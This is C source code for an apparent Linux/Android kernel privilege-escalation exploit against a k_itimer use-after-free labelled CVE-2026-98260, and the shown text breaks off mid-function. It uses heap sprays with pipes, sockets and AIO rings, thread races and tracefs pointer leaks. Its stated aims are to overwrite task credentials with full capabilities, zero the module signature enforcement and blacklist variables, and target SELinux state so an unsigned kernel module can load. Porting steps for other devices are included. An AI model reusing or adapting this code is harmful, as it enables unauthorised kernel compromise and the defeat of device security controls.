/* Park a CVE-2026-98260 zombie, reclaim its timer page with the pipe+AIO
 * path, plant an rb node, and reap. Fail closed: no waitpid unless the
 * filemap line count proves which ring owns the node page.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"
/* copy_process + 0x160: return address of its bl kmem_cache_alloc_node
 * (the task_struct allocation, bytes_req = bytes_alloc = 0x1300). */
#ifndef COPY_ALLOC_LINK
#define COPY_ALLOC_LINK UINT64_C(0xffffffc0800ff0d0)
#endif
#define TASK_ALLOC_SIZE 0x1300
/* kernel/module signing.c: static bool sig_enforce (module_param, "Y" here).
 * Zeroing its 8-byte slot lets ksud late-load an unsigned kernelsu.ko.
 * Link address from this build's kallsyms; neighbours are module_wq (ends
 * at +0x260) and task_exit_notifier (+0x268), so the 8-byte store is safe. */
#ifndef SIG_ENFORCE_LINK
#define SIG_ENFORCE_LINK UINT64_C(0xffffffc0825a0260)
#endif
/* Vendor bootloaders may pass module_blacklist=kernelsu,...; load_module
 * rejects a listed module name with -EPERM after the SELinux checks.
 * module_blacklist is a char* in writable .bss and one_uaf() stores eight
 * zero bytes at the target, so pointing it at the pointer disables the
 * check.  The address is per build and must be in the same link base as
 * the other constants below (the brm_plant builds use 0xffffffc080000000;
 * the 99491 profiles use the 0xffffffc008000000 base, i.e. this value
 * minus 0x78000000).  0 = no list known for this target. */
#ifndef MODULE_BLACKLIST_LINK
#define MODULE_BLACKLIST_LINK UINT64_C(0)
#endif
/* ------------------------------------------------------------------
 * Device specific link addresses.
 *
 * They are NOT hardcoded here on purpose: they differ per kernel build.
 * Generate them for your own device first:
 *
 *     python tools/make-offsets.py --syms syms.txt --out exploit/offsets.h
 *
 * (see docs/08-porting.md)
 * ------------------------------------------------------------------ */
#include "offsets.h"

#if !defined(TIMER_LINK) || !defined(CRED_LINK) || !defined(SELINUX_LINK) || \
    !defined(LINK_USER_NS) || !defined(LINK_ROOT_USER) || \
    !defined(LINK_GROUPS) || !defined(LINK_UCOUNTS)
#error "offsets.h is incomplete - run tools/make-offsets.py first"
#endif
#define FULLCAP UINT64_C(0x1ffffffffff)
/* 6.1.157-android14-11-g2646292297b1 (HONOR GT AMG-AN00, BTF-derived)
 * g84/g77f override with -DTASK_CRED=0x840 (g84 BTF: cred @0x840,
 * real_cred @0x838). */
#ifndef TASK_CRED
#define TASK_CRED 0x838
#endif
#define CRED_SIZE 0xb0
#define CRED_USAGE_OFF 0x00
#define CRED_UID_OFF 0x04
#define CRED_GID_OFF 0x08
#define CRED_SUID_OFF 0x0c
#define CRED_EUID_OFF 0x14
#define CRED_EGID_OFF 0x18
#define CRED_FSUID_OFF 0x1c
#define CRED_FSGID_OFF 0x20
#define CRED_CAP_INH_OFF 0x28
#define CRED_CAP_PRM_OFF 0x30
#define CRED_CAP_EFF_OFF 0x38
#define CRED_CAP_BSET_OFF 0x40
#define CRED_CAP_AMB_OFF 0x48
#define CRED_SECURITY_OFF 0x78
#define CRED_USER_OFF 0x80
#define CRED_USER_NS_OFF 0x88
#define CRED_UCOUNTS_OFF 0x90
#define CRED_GROUP_INFO_OFF 0x98
#define CRED_BLOB_BYTES 32

static uint64_t g_slide = UINT64_C(0);

static void print_cfg(void)
{
	dprintf(STDOUT_FILENO, "[cfg] TIMER=%#" PRIx64 " CRED=%#" PRIx64 " SELINUX=%#" PRIx64 "\n",
		(uint64_t)TIMER_LINK, (uint64_t)CRED_LINK, (uint64_t)SELINUX_LINK);
}

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
/* k_itimer on 6.1: sizeof=0x118, it @0x78, cpu.node @0x78 (timerqueue_node),
 * slab order-1 (8 KiB), 29 objects at 0x118 stride */
#define KITIMER_NODE 0x78
/* g264 = 0x108; g84/g77f BTF = 0x118.  Build with
 * -DKITIMER_SIZE=0x118 for those two targets. */
#ifndef KITIMER_SIZE
#define KITIMER_SIZE 0x108
#endif
#define KITIMER_SLAB_MASK 0x1fffULL
#define NFILL 42
#define NFLUSH 2048
#define MAX_RINGS 9000
#define MAX_PIPES 400
#define NVMA 50000
#define F_SETPIPE_SZ 1031
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[2200];
static int g_all_n;
static int g_pipes[MAX_PIPES][2];
static int g_npipes;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

static int kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}

/* Linear-map base C: VA = (trace_pfn << 12) + C.  C is per boot, so it is
 * calibrated at runtime by calibrate_pfnbase() (see below).  --pfnbase overrides. */
static uint64_t g_pfnbase = UINT64_C(0);

static uint64_t object_pfn(uint64_t ptr)
{
	return ((ptr & ~UINT64_C(0xfff)) - g_pfnbase) >> 12;
}

static uint64_t pfn_to_kva(uint64_t pfn)
{
	return (pfn << 12) + g_pfnbase;
}

static uint64_t g_watch[4500];
static int g_nwatch;

static int cmp_u64(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

static void build_watch(void)
{
	int w = 0;
	g_nwatch = 0;
	for (int i = 0; i < g_all_n && g_nwatch + 2 < (int)(sizeof(g_watch) / sizeof(g_watch[0])); i++) {
		g_watch[g_nwatch++] = object_pfn(g_all[i] + KITIMER_NODE);
		g_watch[g_nwatch++] = object_pfn(g_all[i]) & ~UINT64_C(1);
	}
	qsort(g_watch, (size_t)g_nwatch, sizeof(g_watch[0]), cmp_u64);
	for (int i = 0; i < g_nwatch; i++) {
		if (w && g_watch[w - 1] == g_watch[i])
			continue;
		g_watch[w++] = g_watch[i];
	}
	g_nwatch = w;
}

static int watch_has(uint64_t pfn)
{
	return bsearch(&pfn, g_watch, (size_t)g_nwatch, sizeof(pfn), cmp_u64) != NULL;
}

static int cpu_count(void);

static int pfn_in_line(const char *line, uint64_t pfn)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	uint64_t got;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	return got == pfn;
}

/* Raw pipe scan for page events.  Both kmem:mm_page_alloc and
 * kmem:mm_page_free store [pfn u64][order u32] right after the 8-byte
 * trace_entry (pid lives at pfn_off-4).  need_alloc additionally requires
 * the mm_page_alloc trace_entry prefix 0x010a/0/0 on this build.
 * trace_pipe_raw reads are consuming, so each poll only walks fresh data. */
static int raw_scan_pfn(uint64_t pfn, uint32_t order, int need_alloc)
{
	int ncpu = cpu_count(), found = 0;
	uint8_t *buf = malloc(1U << 20);
	uint8_t needle[8];
	if (!buf)
		return -1;
	memcpy(needle, &pfn, 8);
	for (int cpu = 0; cpu < ncpu && !found; cpu++) {
		char path[128];
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		while (!found) {
			ssize_t n = read(fd, buf, 1U << 20);
			if (n <= 0)
				break;
			for (ssize_t i = 8; i + 16 <= n; i++) {
				uint32_t o;
				int pid;
				if (memcmp(buf + i, needle, 8))
					continue;
				memcpy(&o, buf + i + 8, 4);
				memcpy(&pid, buf + i - 4, 4);
				if (o != order || pid <= 0 || pid > 0x100000)
					continue;
				if (need_alloc && memcmp(buf + i - 8, "\x0a\x01\x00\x00", 4))
					continue;
				found = 1;
				break;
			}
		}
		close(fd);
	}
	free(buf);
	return found;
}

static int raw_scan_palloc(uint64_t pfn, uint32_t order)
{
	return raw_scan_pfn(pfn, order, 1);
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
				fclose(file);
				return 1;
			}
		}
		fclose(file);
	}
	return 0;
}

/* The victim slab is order-1: only an order-1 alloc of that 8 KiB block
 * proves our 8 KiB stream payload owns it.  An order-0 split could hand
 * half of the block to someone else, so require "order=1 migratetype=". */
static int trace_seen_order1(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (strstr(line, kind) && pfn_in_line(line, pfn) &&
			    strstr(line, "order=1 migratetype=")) {
				fclose(file);
				return 1;
			}
		}
		fclose(file);
	}
	return 0;
}

static uint64_t parse_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	if (!p)
		return UINT64_MAX;
	return strtoull(p + 6, NULL, 16);
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

static int g_socks[256][2];
static int g_nsocks;

static void close_socks(void)
{
	for (int i = 0; i < g_nsocks; i++) {
		close(g_socks[i][0]);
		close(g_socks[i][1]);
	}
	g_nsocks = 0;
}

static unsigned long drain_socks(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x42, sizeof(buf));
	g_nsocks = 0;
	for (int i = 0; i < 256 && total < (4UL << 30); i++) {
		int sz = 16 << 20;
		int wrote = 0;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i]))
			break;
		setsockopt(g_socks[i][0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
		setsockopt(g_socks[i][1], SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
		if (fcntl(g_socks[i][0], F_SETFL, O_NONBLOCK)) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		while (wrote < (16 << 20)) {
			ssize_t n = write(g_socks[i][0], buf, sizeof(buf));
			if (n < 0)
				break;
			wrote += (int)n;
		}
		if (!wrote) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		total += (unsigned long)wrote;
		g_nsocks++;
	}
	dprintf(STDOUT_FILENO, "[sock] pairs=%d MiB=%lu\n", g_nsocks, total >> 20);
	return total;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static unsigned long drain_pipes(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x41, sizeof(buf));
	g_npipes = 0;
	int cpus = cpu_count();
	for (int i = 0; i < MAX_PIPES && total < (80UL << 20); i++) {
		int cap, wrote = 0;
		pin_cpu(i % cpus);
		if (pipe(g_pipes[i]))
			break;
		cap = fcntl(g_pipes[i][1], F_SETPIPE_SZ, 1 << 20);
		if (cap < 0)
			cap = 65536;
		if (fcntl(g_pipes[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_pipes[i][0]);
			close(g_pipes[i][1]);
			break;
		}
		while (wrote < cap) {
			size_t chunk = sizeof(buf);
			ssize_t n;
			if (chunk > (size_t)(cap - wrote))
				chunk = (size_t)(cap - wrote);
			n = write(g_pipes[i][1], buf, chunk);
			if (n < 0) {
				if (errno == EAGAIN)
					break;
				close(g_pipes[i][0]);
				close(g_pipes[i][1]);
				dprintf(STDOUT_FILENO, "[drain] write errno=%d\n", errno);
				return total;
			}
			wrote += (int)n;
			total += (unsigned long)n;
		}
		g_npipes++;
	}
	dprintf(STDOUT_FILENO, "[drain] pipes=%d MiB=%lu\n", g_npipes, total >> 20);
	return total;
}

static int read_raw(uint8_t *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	alarm(1);
	while (*used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n < 0) {
			if (errno == EINTR)
				break;
			close(fd);
			return -1;
		}
		if (n == 0)
			break;
		*used += (size_t)n;
	}
	alarm(0);
	close(fd);
	return 0;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint8_t needle[8];
	uint64_t site = slide_addr(TIMER_LINK);
	int fd, n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	*chosen = 0;
	fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		free(buf);
		return -1;
	}
	alarm(2);
	while (used + 4096 < (8U << 20)) {
		ssize_t got = read(fd, buf + used, (8U << 20) - used);
		if (got <= 0)
			break;
		used += (size_t)got;
	}
	alarm(0);
	close(fd);
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t got, ptr, req, alloc;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 16, 8);
		memcpy(&alloc, buf + i + 24, 8);
		if (got != site || req != KITIMER_SIZE || alloc != KITIMER_SIZE ||
		    (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
			g_all[n] = ptr;
		*chosen = (n == index) ? ptr : *chosen;
		n++;
	}
	free(buf);
	*count = n;
	g_all_n = n;
	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
		n, *chosen, used);
	return (n > index && *chosen) ? 0 : -1;
}

static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
{
	uint8_t *buf = malloc(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used)) {
		free(buf);
		return -1;
	}
	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
		uint64_t got, ptr, req, alloc;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 16, 8);
		memcpy(&alloc, buf + i + 24, 8);
		if (got != site || req != bytes || (alloc != bytes + 16 && alloc != bytes + 8))
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		ptrs[n++] = ptr;
	}
	free(buf);
	return n;
}

static int text_has_comm(const char *comm)
{
	FILE *file = fopen(CPU0_TRACE, "r");
	char line[768];
	int n = 0;
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		if (strstr(line, "do_timer_create") && strstr(line, comm))
			n++;
	}
	fclose(file);
	return n;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	timer_t id;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(0))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	timer_t armed;
	int made = 0;
	for (int i = 0; i < 2048; i++) {
		timer_t extra;
		if (timer_create(CLOCK_THREAD_CPUTIME_ID,
				 i == 1024 ? &armed_event : &event, &extra))
			_exit(120);
		if (i == 1024) {
			armed = extra;
			if (timer_settime(armed, 0, &spec, NULL))
				_exit(120);
		}
		made++;
	}
	if (made < 2048)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec] begin tid=%ld\n", (long)syscall(SYS_gettid));
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(1))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}
static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

static int line_has_pfn(const char *line, uint64_t pfn)
{
	char exact[40];
	char *hit;
	int n = snprintf(exact, sizeof(exact), "pfn=0x%" PRIx64, pfn);
	if (n <= 0)
		return 0;
	hit = strstr(line, exact);
	if (!hit)
		return 0;
	{
		char end = hit[n];
		if ((end >= '0' && end <= '9') ||
		    (end >= 'a' && end <= 'f') ||
		    (end >= 'A' && end <= 'F'))
			return 0;
	}
	return 1;
}

static int raw_has_ptr(uint64_t ptr)
{
	uint8_t needle[8];
	int cpu;
	memcpy(needle, &ptr, 8);
	for (cpu = 0; cpu < 8; cpu++) {
		char path[128];
		uint8_t *buf = malloc(8U << 20);
		size_t used = 0;
		int fd;
		if (!buf)
			return -1;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_CLOEXEC);
		if (fd >= 0) {
			alarm(2);
			while (used + 4096 < (8U << 20)) {
				ssize_t n = read(fd, buf + used, (8U << 20) - used);
				if (n < 0) {
					if (errno == EINTR)
						break;
					break;
				}
				if (n == 0)
					break;
				used += (size_t)n;
			}
			alarm(0);
			close(fd);
		}
		dprintf(STDOUT_FILENO, "[freeobj] cpu%d raw_bytes=%zu\n", cpu, used);
		for (size_t i = 0; i + 8 <= used; i++) {
			if (!memcmp(buf + i, needle, 8)) {
				free(buf);
				dprintf(STDOUT_FILENO, "[freeobj] ptr on cpu%d raw_bytes=%zu\n",
					cpu, used);
				return 1;
			}
		}
		free(buf);
	}
	return 0;
}

static int flush_timers(void)
{
	struct sigevent event;
	timer_t *ids = calloc(NFLUSH, sizeof(*ids));
	int created = 0;
	if (!ids)
		return -1;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < NFLUSH; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
			break;
		created++;
	}
	for (int i = 0; i < created; i++)
		timer_delete(ids[i]);
	free(ids);
	dprintf(STDOUT_FILENO, "[flush] deleted=%d\n", created);
	return created >= 256 ? 0 : -1;
}

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];
static int g_cpu_lines[MAX_CPU];
static int g_hit_cpu = -1;
static int g_hit_index = -1;

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static void *spray_cpu(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	struct timespec pause = { .tv_nsec = 400000000 };
	if (pin_cpu(cpu))
		return NULL;
	while (!atomic_load_explicit(&g_stop, memory_order_acquire) &&
	       g_cpu_n[cpu] < PER_CPU_RINGS) {
		int batch = 0;
		for (int i = 0; i < 32 && g_cpu_n[cpu] < PER_CPU_RINGS; i++) {
			uint64_t ctx = 0;
			if (syscall(SYS_io_setup, 1, &ctx)) {
				dprintf(STDOUT_FILENO, "[aio] cpu%d stop errno=%d n=%d\n",
					cpu, errno, g_cpu_n[cpu]);
				return NULL;
			}
			g_cpu_ctx[cpu][g_cpu_n[cpu]++] = ctx;
			batch++;
		}
		if (!batch)
			break;
		nanosleep(&pause, NULL);
	}
	return NULL;
}

static int reclaim_and_plant(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	pthread_t threads[MAX_CPU];
	int ncpu, other = 0, rings = 0, free_hits = 0, alloc_hits = 0;
	int shown = 0, victim_frees = 0;
	uint64_t victim_base;
	if (node_off + 24 > 4096) {
		dprintf(STDOUT_FILENO, "[plant] node crosses a page off=%#x\n", node_off);
		return -1;
	}
	build_watch();
	victim_base = node_pfn & ~UINT64_C(1);
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[aio] cpus=%d watch=%d node_pfn=%#" PRIx64 "\n",
		ncpu, g_nwatch, node_pfn);
	if (write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n"))
		return -1;
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	for (int cpu = 0; cpu < ncpu; cpu++) {
		if (pthread_create(&threads[cpu], NULL, spray_cpu, (void *)(intptr_t)cpu))
			ncpu = cpu;
	}
	for (int cpu = 0; cpu < ncpu; cpu++)
		pthread_join(threads[cpu], NULL);
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		int lines = 0;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			int filemap = strstr(line, "mm_filemap_add_to_page_cache:") &&
				      strstr(line, "uaf_plant");
